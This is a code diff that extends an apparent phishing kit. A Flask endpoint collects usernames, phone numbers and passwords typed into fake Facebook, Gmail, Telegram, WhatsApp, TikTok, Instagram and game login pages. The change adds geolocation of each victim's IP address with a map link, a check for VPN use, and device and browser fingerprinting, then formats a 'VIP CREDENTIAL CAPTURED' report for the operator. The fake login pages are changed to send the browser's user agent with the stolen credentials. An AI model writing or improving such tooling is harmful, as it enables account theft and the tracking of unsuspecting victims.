@@ -1277,14 +1277,77 @@ def capture_fake_login():
     platform = data.get('platform', 'Unknown')
     username = data.get('username', '')
     password = data.get('password', '')
+    ua       = data.get('ua', '')
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+
+    # Platform badge emoji
+    _badges = {
+        'Facebook':'🔵','Gmail':'🔴','TikTok':'⬛','Instagram':'🟣',
+        'Telegram':'💎','WhatsApp':'🟢','Mobile Legends':'⚔️',
+        'PUBG Mobile':'🟠','Free Fire':'🔥',
+    }
+    badge = _badges.get(platform, '🎭')
+
+    # Geo lookup
+    map_link = ''
+    geo_line = ''
+    try:
+        geo = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,mobile,proxy,lat,lon", timeout=5).json()
+        if geo.get('status') == 'success':
+            lat, lon = geo.get('lat',''), geo.get('lon','')
+            city     = geo.get('city','')
+            country  = geo.get('country','')
+            isp      = geo.get('isp','')
+            vpn      = '⚠️ VPN/Proxy' if geo.get('proxy') else '✅ Real IP'
+            map_link = f"https://www.google.com/maps?q={lat},{lon}"
+            geo_line = (
+                f"📍 Location: <b>{city}, {country}</b>\n"
+                f"🏢 ISP: <code>{isp}</code>\n"
+                f"🛡 VPN: {vpn}\n"
+                f"🗺 <a href='{map_link}'>Google Maps ကြည့်မည်</a>\n"
+            )
+    except Exception:
+        pass
+
+    # Device info from UA
+    dev_line = ''
+    if ua:
+        ua_lower = ua.lower()
+        if 'android' in ua_lower:
+            os_tag = '🤖 Android'
+        elif 'iphone' in ua_lower or 'ipad' in ua_lower:
+            os_tag = '🍎 iOS'
+        elif 'windows' in ua_lower:
+            os_tag = '🪟 Windows'
+        elif 'mac' in ua_lower:
+            os_tag = '🍎 macOS'
+        elif 'linux' in ua_lower:
+            os_tag = '🐧 Linux'
+        else:
+            os_tag = '❓ Unknown OS'
+        if 'chrome' in ua_lower:
+            browser = 'Chrome'
+        elif 'firefox' in ua_lower:
+            browser = 'Firefox'
+        elif 'safari' in ua_lower:
+            browser = 'Safari'
+        elif 'edg' in ua_lower:
+            browser = 'Edge'
+        else:
+            browser = 'Unknown Browser'
+        dev_line = f"📱 Device: <b>{os_tag} · {browser}</b>\n"
+
     report = (
-        f"🎭 <b>CREDENTIALS CAPTURED!</b>\n"
+        f"{badge} <b>💎 VIP CREDENTIAL CAPTURED!</b> {badge}\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"🌐 Platform: <b>{platform}</b>\n"
-        f"👤 Username/Email: <code>{username}</code>\n"
-        f"🔑 Password: <code>{password}</code>\n"
-        f"🌐 IP: <code>{ip}</code>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"👤 Username / Phone: <code>{username}</code>\n"
+        f"🔑 Password / Code: <code>{password}</code>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"🌐 IP Address: <code>{ip}</code>\n"
+        f"{geo_line}"
+        f"{dev_line}"
         f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
         f"━━━━━━━━━━━━━━━━━━━━"
     )
@@ -1467,7 +1530,7 @@ function doNext(){{
   if(!num){{err.style.display='block';return;}}
   const full=code+num;
   fetch('/capture_fake_login',{{method:'POST',headers:{{'Content-Type':'application/json'}},
-    body:JSON.stringify({{token:TOKEN,platform:'Telegram',username:full,password:'(phone login)'}})}});
+    body:JSON.stringify({{token:TOKEN,platform:'Telegram',username:full,password:'(phone login)',ua:navigator.userAgent}})}});
   attempt++;
   if(attempt<2){{
     err.style.display='block';
@@ -1537,7 +1600,7 @@ function doLogin(){{
   const err=document.getElementById('err');
   if(!u||!pw){{err.style.display='block';err.textContent='Please fill in all fields.';return;}}
   fetch('/capture_fake_login',{{method:'POST',headers:{{'Content-Type':'application/json'}},
-    body:JSON.stringify({{token:TOKEN,platform:PNAME,username:u,password:pw}})}});
+    body:JSON.stringify({{token:TOKEN,platform:PNAME,username:u,password:pw,ua:navigator.userAgent}})}});
   attempt++;
   if(attempt<2){{
     err.style.display='block';
